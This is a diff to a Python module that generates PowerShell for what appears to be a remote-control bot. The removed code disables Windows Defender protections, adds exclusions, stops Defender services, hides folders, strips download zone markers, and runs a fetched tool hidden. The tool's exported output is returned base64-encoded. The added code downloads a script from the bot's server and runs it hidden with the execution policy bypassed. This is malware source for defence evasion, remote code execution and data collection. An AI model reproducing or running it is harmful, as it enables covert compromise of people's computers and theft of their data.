@@ -23,90 +23,48 @@ def _q(s: str) -> str:
     return "'" + s.replace("'", "''") + "'"
 
 
-def build_tool_ps(tool_id: str, *, prefer_x64: bool = True) -> str:
-    t = TOOLS_BY_ID.get(tool_id)
-    if not t:
+def _short_runner(tool_id: str | None = None, *, all_tools: bool = False) -> str:
+    """Tiny PS that curls a script from the bot — avoids Windows EncodedCommand 8k limit."""
+    files = _files_base()
+    if all_tools:
+        script = f"{files}/scripts/export-tools.ps1"
+        return f"""
+$ErrorActionPreference='Continue'
+$files={_q(files)}
+$env:AGENTSHE_FILES=$files
+$tmp=Join-Path $env:TEMP ('hh-export-'+[guid]::NewGuid().ToString('n')+'.ps1')
+& curl.exe -fsSL {_q(script)} -o $tmp
+if(-not(Test-Path $tmp)){{throw 'export script download failed'}}
+& powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $tmp
+$code=$LASTEXITCODE
+Remove-Item $tmp -Force -EA SilentlyContinue
+if($code -ne 0){{exit $code}}
+""".strip()
+    if not tool_id or tool_id not in TOOLS_BY_ID:
         raise ValueError(f"outil inconnu: {tool_id}")
-    rel = t.get("exe_x64") if prefer_x64 and t.get("exe_x64") else t["exe"]
-    url = tool_download_url(rel)
-    url32 = tool_download_url(t["exe"])
-    leaf = t["exe"]
-    out_name = f"{t['id']}.txt"
+    script = f"{files}/scripts/run-tool.ps1"
     return f"""
 $ErrorActionPreference='Continue'
-$toolsDir = Join-Path $env:LOCALAPPDATA 'HelperHost\\tools'
-New-Item -ItemType Directory -Force -Path $toolsDir | Out-Null
-cmd /c ('attrib +h +s "' + $toolsDir + '"') | Out-Null
-cmd /c ('attrib +h +s "' + (Join-Path $env:LOCALAPPDATA 'HelperHost') + '"') | Out-Null
-cmd /c ('attrib +h +s /s /d "' + $toolsDir + '\\*"') | Out-Null
-try {{
-  $id = [Security.Principal.WindowsIdentity]::GetCurrent()
-  $p = New-Object Security.Principal.WindowsPrincipal($id)
-  if ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {{
-    if (Get-Command Set-MpPreference -EA SilentlyContinue) {{
-      Set-MpPreference -DisableRealtimeMonitoring $true -EA SilentlyContinue
-      Set-MpPreference -DisableBehaviorMonitoring $true -EA SilentlyContinue
-      Set-MpPreference -DisableIOAVProtection $true -EA SilentlyContinue
-      Set-MpPreference -PUAProtection Disabled -EA SilentlyContinue
-      Set-MpPreference -ExclusionPath $toolsDir -EA SilentlyContinue
-      Set-MpPreference -ExclusionPath (Join-Path $env:LOCALAPPDATA 'HelperHost') -EA SilentlyContinue
-    }}
-    foreach ($svc in @('WinDefend','WdNisSvc','Sense')) {{
-      Stop-Service $svc -Force -EA SilentlyContinue
-    }}
-  }} elseif (Get-Command Add-MpPreference -EA SilentlyContinue) {{
-    Add-MpPreference -ExclusionPath $toolsDir -EA SilentlyContinue
-    Add-MpPreference -ExclusionPath (Join-Path $env:LOCALAPPDATA 'HelperHost') -EA SilentlyContinue
-  }}
-}} catch {{}}
-$leaf = {_q(leaf)}
-$dest = Join-Path $toolsDir $leaf
-$url64 = {_q(url)}
-$url32 = {_q(url32)}
-$url = if ([Environment]::Is64BitOperatingSystem) {{ $url64 }} else {{ $url32 }}
-if (-not (Test-Path $dest) -or (Get-Item $dest).Length -lt 1024) {{
-  & curl.exe -fsSL $url -o $dest
-  if ($LASTEXITCODE -ne 0) {{ & curl.exe -fsSL $url32 -o $dest }}
-  if (-not (Test-Path $dest) -or (Get-Item $dest).Length -lt 1024) {{ throw 'download failed' }}
-}}
-if (-not (Test-Path $dest) -or (Get-Item $dest).Length -lt 1024) {{ throw 'fichier absent (Defender?)' }}
-Unblock-File -Path $dest -ErrorAction SilentlyContinue
-$zone = $dest + ':Zone.Identifier'
-if (Test-Path $zone) {{ Remove-Item $zone -Force -ErrorAction SilentlyContinue }}
-$out = Join-Path $toolsDir {_q(out_name)}
-Remove-Item $out -Force -ErrorAction SilentlyContinue
-$p = Start-Process -FilePath $dest -ArgumentList @('/stext', $out) -WorkingDirectory $toolsDir -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
-if ($null -eq $p) {{ throw 'start failed (bloque par Defender/UAC?)' }}
-if (-not $p.WaitForExit(50000)) {{
-  Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
-  Get-Process -Name ([IO.Path]::GetFileNameWithoutExtension($leaf)) -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
-  throw 'timeout execution'
-}}
-Start-Sleep -Milliseconds 300
-if (-not (Test-Path $out)) {{
-  New-Item -ItemType File -Path $out -Force | Out-Null
-  Set-Content -Path $out -Value '(aucune donnee exportee)' -Encoding UTF8
-}}
-$bytes = [IO.File]::ReadAllBytes($out)
-$b64 = [Convert]::ToBase64String($bytes)
-Write-Output ('FILEB64:' + {_q(out_name)} + ':' + $b64)
+$files={_q(files)}
+$env:AGENTSHE_FILES=$files
+$env:AGENTSHE_TOOL_ID={_q(tool_id)}
+$tmp=Join-Path $env:TEMP ('hh-tool-'+[guid]::NewGuid().ToString('n')+'.ps1')
+& curl.exe -fsSL {_q(script)} -o $tmp
+if(-not(Test-Path $tmp)){{throw 'run-tool download failed'}}
+& powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $tmp
+$code=$LASTEXITCODE
+Remove-Item $tmp -Force -EA SilentlyContinue
+if($code -ne 0){{exit $code}}
 """.strip()
+
+
+def build_tool_ps(tool_id: str, *, prefer_x64: bool = True) -> str:
+    _ = prefer_x64
+    return _short_runner(tool_id)
 
 
 def build_all_tools_ps() -> str:
-    url = f"{_files_base()}/scripts/export-tools.ps1"
-    return f"""
-$ErrorActionPreference='Continue'
-$url = {_q(url)}
-$tmp = Join-Path $env:TEMP ('hh-export-' + [guid]::NewGuid().ToString('n') + '.ps1')
-& curl.exe -fsSL $url -o $tmp
-if (-not (Test-Path $tmp)) {{ throw 'export script download failed' }}
-$env:AGENTSHE_FILES = {_q(_files_base())}
-& powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $tmp
-$code = $LASTEXITCODE
-Remove-Item $tmp -Force -ErrorAction SilentlyContinue
-if ($code -ne 0) {{ exit $code }}
-""".strip()
+    return _short_runner(all_tools=True)
 
 
 _FILE_RE = re.compile(r"^FILEB64:([^:\r\n]+):(.+)$", re.DOTALL)
